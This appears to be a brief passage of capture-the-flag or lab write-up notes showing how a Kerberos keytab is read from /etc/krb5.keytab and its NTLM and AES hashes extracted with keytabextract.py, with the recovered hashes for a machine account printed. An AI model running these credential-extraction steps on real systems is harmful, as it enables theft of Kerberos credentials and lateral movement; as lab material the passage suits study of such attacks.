- Retrieve keystab : 
```sh
cat /etc/krb5.keytab | base64
python3 keytabextract.py file.keytab
```
- Extracting hash : 
```sh
 python3 keytabextract.py krb5.keytab
 
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : TENGU.VL
        SERVICE PRINCIPAL : NODERED$/
        NTLM HASH : d4210ee2db0c03aa3611c9ef8a4dbf49
        AES-256 HASH : 4ce11c580289227f38f8cc0225456224941d525d1e525c353ea1e1ec83138096
        AES-128 HASH : 3e04b61b939f61018d2c27d4dc0b385f
```